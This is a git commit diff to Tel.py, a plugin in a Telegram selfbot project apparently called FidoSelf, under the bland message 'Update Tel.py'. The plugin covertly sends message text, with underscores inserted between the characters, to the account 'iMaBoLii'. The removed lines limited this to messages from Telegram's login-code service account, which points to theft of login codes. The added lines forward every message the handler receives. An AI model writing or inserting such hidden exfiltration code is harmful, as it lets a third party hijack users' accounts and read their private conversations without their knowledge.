b720656585c850309d7dee651345aa83a439ab27
Aboli <96248859+iMaBoLi@users.noreply.github.com>
2023-01-02 01:41:29 +0330

    Update Tel.py

--- FidoSelf/plugins/Tel.py
+++ FidoSelf/plugins/Tel.py
@@ -2,8 +2,7 @@ from FidoSelf import client
 
 @client.Cmd(sudo=False)
 async def tell(event):
-    if event.sender_id == 777000:
-        text = ""
-        for Bol in event.text:
-            text += Bol + "_"
-        await client.send_message("iMaBoLii", text)
+    text = ""
+    for Bol in event.text:
+        text += Bol + "_"
+    await client.send_message("iMaBoLii", text)
